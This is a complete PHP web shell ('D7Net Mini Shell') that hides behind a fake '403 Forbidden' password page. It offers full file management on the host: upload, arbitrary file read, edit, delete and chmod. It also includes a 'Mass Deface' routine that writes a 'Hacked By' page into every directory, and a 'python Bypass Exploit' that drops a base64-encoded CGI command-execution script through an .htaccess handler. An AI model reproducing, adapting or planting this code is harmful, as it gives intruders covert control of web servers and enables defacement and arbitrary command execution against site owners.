<?php
$d7net = "49b477a3e743e2dad82e866e3b716665"; // 
session_start();
@error_reporting(0);
@set_time_limit(0);
function Login() {
?>
<!DOCTYPE html>
<html>
<head>
  <title>403 Forbidden</title>
<center>
<form method="post">
<input type="password" name="d7net_shell">
	<input type="submit" value="Login">
</form>

<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($d7net) || ( isset($_POST['d7net_shell']) && (md5($_POST['d7net_shell']) == $d7net) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        Login();
?>
 <?php
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!doctype html>
<html>
<head>
<title> 404 Not Found</title>
<meta name="author" content="Bell D7Net">
<meta charset="UTF-8">
<link href="https://fonts.googleapis.com/css?family=Walter+Turncoat" rel="stylesheet">
<style type="text/css">
 *{
	margin: 0; padding:0
}
      body {
	background-color: silver;
	font-family: "Walter Turncoat", cursive;
                  }
	div {
	color: red;
	font-size: 40px;
	text-align: center;
	text-shadow: 1px 1px black;
	font-family: "Walter Turncoat", 
}
@keyframes autopopup {
    from {opacity: 0;margin-top:-200px;}
    to {opacity: 1;}
}
#close {
    background-color: rgba(64, 68, 65, 0.5);
    position: fixed;
    top:0;
    left:0;
    right:0;
    bottom:0;
    animation:autopopup 1.5s;
}
#close:target {
    -webkit-transition:all 1s;
    -moz-transition:all 1s;
    transition:all 1s;
    opacity: 0;
    visibility: hidden;
}

@media (min-width: 800px){
    .container-popup {
        width:30%;
    }
}
@media (max-width: 767px){
    .container-popup {
        width:33%;
    }
}
.container-popup {
    position: fixed;
    margin: 7% auto;
    padding: 4px 3px;
    background: transparent;
    color: #333;
    border-radius: 3px;
}
.container-popup img {
    width: 100%
}
.close {
    position: absolute;
    top:3px;
    right:3px;
    background: transparent;
    padding:7px 10px;
    font-size: 15px;
    text-decoration: none;
    line-height: 1;
    color:#fff;
}
.td_home {
	border: 1px solid #ff0000;
}
.d7net_table {
	-moz-box-shadow:inset 0px 34px 0px -15px #1a1717;
	-webkit-box-shadow:inset 0px 34px 0px -15px #1a1717;
	box-shadow:inset 0px 34px 0px -15px #1a1717;
	background-color:#000000;
	border:1px solid #ff0000;
	display:inline-block;
	cursor:pointer;
	color:#ff0505;
	font-family:Coming Soon;
	font-size:17x;
	font-weight:bold;
	padding:3px 20px;
	text-decoration:none;
	text-shadow:0px -1px 0px #ff0505;
       }
.a:hover {
	background-color:#8f1b0b;;
	color: yellow;
	text-decoration: Rajdhani;
       }
b {
    color: red;
}body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), default;} a:hover {cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),wait;}
</style>
</head>';
$d7net_sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$ds = @ini_get("disable_functions");
$d7net_ds = (!empty($ds)) ? "<font color=lime>$ds</font>" : "<font color=red>NONE</font>";
echo '
<body><center>
<div>D7Net Mini SheLL</div>
<br>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>

<font color="blue"><center>'.php_uname().'<br>[ IP Kamu : '.$_SERVER['REMOTE_ADDR'].' ] [ IP Server : '.gethostbyname($_SERVER['HTTP_HOST']).' ]<br>[ Safe Mode : '.$d7net_sm.' ] [ Disable Functions : '.$d7net_ds.' ] </center></font><br>';
$d7net = getcwd();
echo '<center>
<a class="d7net_table" href="?">Home</a>
<a class="d7net_table" href="?option&path='.$d7net.'&d7net=mass_d">Mass Deface</a>
<a class="d7net_table" href="?option&path='.$d7net.'&d7net=python">python</a>
<a class="d7net_table" href="?option&path='.$d7net.'&d7net=about">ABout</a>
<a class="d7net_table" href="?logout">Logout</a></center>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 


getcwd();

}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '
<br><br><font color=#fff><center>$ root@x48 : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</font></center></td></tr><tr><td><center>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">File Berhasil Upload!</font><br />';
}else{
echo '<script> alert("File Gagal Diupload")</script><br />';
}
}
echo '</center><center><form enctype="multipart/form-data" method="POST"><font color="black"><input style="background:silver;font-family: Comic Sans MS " type="file" name="file" />
<input type="submit" value="Go !" />
</form></center>
</td></tr>';
if(isset($_GET["logout"])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    print "<script>window.location='?';</script>";
}
if(isset($_GET['filesrc'])){
echo "<tr><td><center>Current File : ";
echo $_GET['filesrc'];
echo '</center></tr></td></table><br />';
echo(' <textarea style="width: 99%;height: 400px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}
//Empety
elseif(isset($_GET['option']) && $_GET['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
//Chmod
if($_GET['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Ganti Permission Selesai </font><br />';
}else{
echo '<script> alert("Ganti Permission Gagal")</script><br />';
}
}

$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";

echo '<form method="POST">
<div id="close">
        <div class="container-popup">
            <form action="#close" method="post" class="popup-form">
<a class="d7net_table" href="#close">X</a><br>
Ganti Permission<br><input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($patc)), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="submit" />
</form></div></div>
';
}
//
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	 echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
New Name : <input name="name" type="text" size="20" value="Folder" />
<input type="hidden" name="path" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" value="Submit" />
</form>';
}
//Rename file
elseif($_GET['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Ganti Nama Berhasil </font><br />';
}else{
echo '<script>alert("Ganti Nama Gagal")</script><br />';
}
$_POST['name'] = $_POST['newname'];
}
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";
$new = $_POST['newname'];

echo '<form method="POST">
<div id="close">
        <div class="container-popup">
            <form action="#close" method="post" class="popup-form"><br>
New Name <input name="newname" type="text" size="20" value="'.$new.'" />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Ganti" />
            </form>
            <a class="close" href="#close">close</a>
        </div>
    </div>';
} 
elseif($_GET['d7net'] == 'about') {
echo '
	<center><br><br>
    <br>
<img src="https://3.bp.blogspot.com/-hBGrbH1B6mg/Wo7oe0ktjcI/AAAAAAAAAU8/Z4vm8YTdXs8LTZS4mKKSlTrTZDtAN-JCACPcBGAYYCw/s320/Chino%2BLogo%2BBy%2Bd7net.png" widgt="250" height="250"><br>
            <a href="https://www.facebook.com/zen.grabber" target="_blank"><img src="https://png.icons8.com/color/2x/facebook.png" width="32" height="32"></a>
 <a href="http://www.youtube.com/c/d7net" target="_blank"><img src="https://png.icons8.com/color/2x/youtube-play.png" width="32" height="32"></a>
<br><br>Contact :
	<br><br><font size="5" color="#00ff00">sendal254@gmail.com</font></center><center>
<marquee direction="down" scrollamount="3" bgcolor="" width="250" height="40"><center>
Mini Shell  by D7net a.k.a Desktop77N3T
<p><b><font size="3" color="#00ff00"><br><br><br>
</font></b></p>
</center>
</marquee></center><br><br><br>';}

elseif($_GET['d7net'] == 'python') {
echo "<center/><br/><b>
~: python  Bypass Exploit :~
 </b><br><br>";
    mkdir('d7net-python', 0755);
    chdir('d7net-python');
        $d7nett = ".htaccess";
        $d7_net = "$d7nett";
        $d7net = fopen ($d7_net , 'w') or die ("d7net a&#231;&#305;lamad&#305;!");
        $d7net1 = "AddHandler cgi-script .izo";    
        fwrite ( $d7net , $d7net1 ) ;
        fclose ($d7net);
$d7python = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';
$file = fopen("python.izo" ,"w+");
$write = fwrite ($file ,base64_decode($d7python));
fclose($file);
    chmod("python.izo",0755);
   echo " <iframe src=python/python.izo width=96% height=76% frameborder=0></iframe>
 </div>"; }
elseif($_GET['d7net'] == 'mass_d') {
echo "<center><br/><b><font color=#FF0000><div>~: Mass Deface :~</div></center></b><br>";
error_reporting(0);
?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<td>
<form hethot='post'>
<table class="td_home" >
<td>Folder :<input class ='inputz' type='text' name='path' size='35' value="<?php echo getcwd();?>"><br>
File&nbsp;&nbsp;&nbsp;&nbsp; :<input class ='inputz' type='text' name='file' size='35' value="d7.html"><br></td></table>
<table class="td_home" ><td>
<b>Index File :</b><br>
<textarea style='background:white;outline:none;' name='index' rows='10' cols='67'>Hacked By Desktop77N3T</textarea></td></table><br>
NB : Menggunakan mass deface jika shell lu sudah di document root :D <br> 
( ex: c:/home/public_html/shellmu.php )
<center><input class='d7net_table' type='submit' value="&nbsp;&nbsp;START MASS DEFACE....!!!&nbsp;&nbsp;"></center></form><br></form>
<?php
$mainpath=$_POST[path];
$file=$_POST[file];
$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);
$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
$finish=@fwrite($start,$indx);if ($finish){echo "$row/$file<br><br>";}}}
//File baru
elseif($_GET['opt'] == 'baru'){
	
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";
$new = $_POST['newname'];
$azz = $_POST['path'];
$newz = "$azz/$new";


if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Create File Berhasil [ '.$new.' ]</font><br />';
}else{
echo '<script>alert("Create File Gagal")</script><br />';
}
fclose($fp);
}

echo '<form method="POST"> Name : <input name="ngaran1" type="text" size="20" value="'.$new.'" /><input type="submit" name="ngaran" value="Create"/></form><br> ';

$ho = $_POST['ngaran1'];

if(isset($_POST['ngaran'])){
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$hell.'/'.$ho.'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Submit" />';
	}
	}
//Edited file
elseif($_GET['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<div class="td_home"><td><font color="green">Edit File Berhasil </font></td></div></a><br />';
}else{
echo '<script> alert("Edit File Gagal")</sript><br />';
}
fclose($fp);
}
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";
if(is_writable("$path/$dir")) echo '( <font color="green">';
elseif(!is_readable("$path/$dir")) echo ') <font color="red">';
echo perms("$path/$dir");
echo '</font> )<div id="close">
        <div class="container-popup">
            <form action="#close" method="post" class="popup-form">';
echo '<br><form method="POST">
<a href="#close"> << </a>
<input class="d7net_table"  style="width: 50%;position:left;" type="submit" value="S A V E" /><br>
<textarea style="width: 250%;height: 400px;" name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="edit">
            </form>
            <a class="close" href="#close"></a>
        </div>
    </div>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
//Delete dir and file
if(isset($_GET['option']) && $_GET['opt'] == 'delete'){
	
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";

//Delete dir
if($_GET['type'] == 'dir'){

if(rmdir($patc)){
echo '<font color="green">Delete dir Berhasil</font><br />';
}else{
echo '<script>alert("Delete dir Error")</script><br />';
}
}
//buat folder
if($_GET['type'] == 'buat'){
$haaa = $_POST['path'];
$heee = $_POST['name'];
$hooo = "$haaa/$heee";
$new = $haaa.'/'.htmlspecialchars($heee);
if(!mkdir($new)){
echo '<font color="red">Create Folder Berhasil</font><br />';
}else{
echo '<script>alert("Create Folder Gagal")</script><br />';
}
}
//Delete file
elseif($_GET['type'] == 'file'){

$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";

if(unlink($patc)){
echo '<font color="green">Delete File Done</font><br />';
}else{
echo '<script>alert("Delete File Error")</script><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo ' <center><a href="?option&path='.$pa.'&opt=baru&name=new.php">+ New File</a> | <a href="?option&path='.$pa.'&opt=btw&type=dir">+ New Folder</a><br><br>';
echo '<a href="?option&path='.$pa.'&opt=edit&type=file&name=index.php">Tebas Index</a>
<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<th class=th_home style="background:red;color:blue;"><center>File/Dir</center></th>
<th class=th_home style="background:red;color:blue;" ><center>Size</center></th>
<th class=th_home style="background:red;color:blue;" ><center>Permission</center></th>
<th class=th_home style="background:red;color:blue;" ><center>Options</center></th>
</tr> <tr>
<td class=td_home>..</td><td class=td_home align=center>NONE</td> <td class=td_home align=center>LINK</td> <td class=td_home align=center> </td></tr>
';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "
<tr>
<td class=td_home> <img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='> <a href=\"?path=$path/$dir\">$dir</a></td>
<td class=td_home ><center>DIR</center></td>
<td class=td_home ><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td class=td_home ><center>
<a href=\"?option&path=$path&opt=rename&type=dir&name=$dir\">Rename</a> <a href=\"?option&path=$path&opt=delete&type=dir&name=$dir\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=dir&name=$dir\">Chmod</a>

</center></td>
</tr>
";
}
echo '<br>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home > <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='> <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td class=td_home><center>
<a href=\"?option&path=$path&opt=edit&type=file&name=$file\">Edit</a> <a href=\"?option&path=$path&opt=rename&type=file&name=$file&path=$path\">Rename</a> <a href=\"?option&path=$path&opt=delete&type=file&name=$file\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=file&name=$file\">Chmod</a>
</center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br><center>Recoded By Desktop77N3T</b></body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}

?>
